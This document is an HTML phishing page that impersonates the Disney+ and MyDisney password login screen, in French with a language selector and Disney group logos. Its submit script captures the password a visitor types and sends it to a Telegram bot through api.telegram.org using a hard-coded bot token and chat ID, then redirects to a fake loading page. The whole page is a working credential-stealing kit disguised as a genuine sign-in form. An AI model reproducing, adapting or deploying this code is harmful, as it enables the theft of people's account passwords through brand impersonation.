<!DOCTYPE html>
<html lang="">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="robots" content="noindex, nofollow"/>
  <title data-i18n-key="pwPageTitle">Mot de passe | Disney+</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <!-- S√©lecteur de langue -->
  <div class="lang-container">
    <label for="lang-select" data-i18n-key="langLabel">Langue :</label>
    <select id="lang-select">
      <option value="fr">Fran√ßais</option>
      <option value="en">English</option>
      <option value="de">Deutsch</option>
      <option value="es">Espa√±ol</option>
    </select>
  </div>

  <main>
    <img src="Images/compose2.png" alt="Disney+" class="logo" />
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney" />

    <h1 data-i18n-key="pwTitle">Entrez votre mot de passe</h1>
    <p data-i18n-key="pwPrompt">
      Pour continuer avec votre compte MyDisney, veuillez saisir votre mot de passe.
    </p>

    <form id="passwordForm">
      <input
        type="password"
        placeholder=""
        data-i18n-key="pwPlaceholder"
        required
      />
      <button type="submit" class="btn" data-i18n-key="pwBtn">Se connecter</button>
    </form>

    <div class="footer-note" data-i18n-key="pwFooter">
      <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
      MyDisney vous permet d'acc√©der facilement aux diff√©rents services des entreprises du groupe Walt Disney, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+" />
        <img src="Images/abc-logo-image-4413.png" alt="ABC" />
        <img src="Images/espn-png-logo-4149.png" alt="ESPN" />
        <img src="Images/marvel-logo-34291.png" alt="Marvel" />
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars" />
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu" />
        <img src="Images/natgeo-logo.png" alt="National Geographic" />
      </div>
    </div>
  </main>

  <!-- Spinner Overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <!-- i18n init -->
  <script src="i18n.js"></script>
  <script>
    // m√™me logique que dans les autres pages
    function getLanguage() {
      let l = localStorage.getItem('lang') || navigator.language.slice(0,2) || 'fr';
      if (!translations[l]) l = 'fr';
      return l;
    }
    const lang = getLanguage();
    localStorage.setItem('lang', lang);
    document.documentElement.lang = lang;

    const select = document.getElementById('lang-select');
    select.value = lang;
    select.addEventListener('change', e => {
      localStorage.setItem('lang', e.target.value);
      window.location.reload();
    });

    document.querySelectorAll('[data-i18n-key]').forEach(el => {
      const key = el.getAttribute('data-i18n-key');
      if (el.tagName === 'INPUT') {
        el.placeholder = translations[lang][key] || '';
      } else {
        el.innerText = translations[lang][key] || el.innerText;
      }
    });
  </script>

  <script>
    document.getElementById("passwordForm").addEventListener("submit", function (e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const pwd = this.querySelector('input[type="password"]').value.trim();
      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chatId   = "-4970333928";
      const msg      = `üîê Mot de passe saisi : ${pwd}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      }).catch(console.error)
        .finally(() => setTimeout(() => {
          window.location.href = "loading2.html";
        }, 2500));
    });
  </script>
</body>
</html>
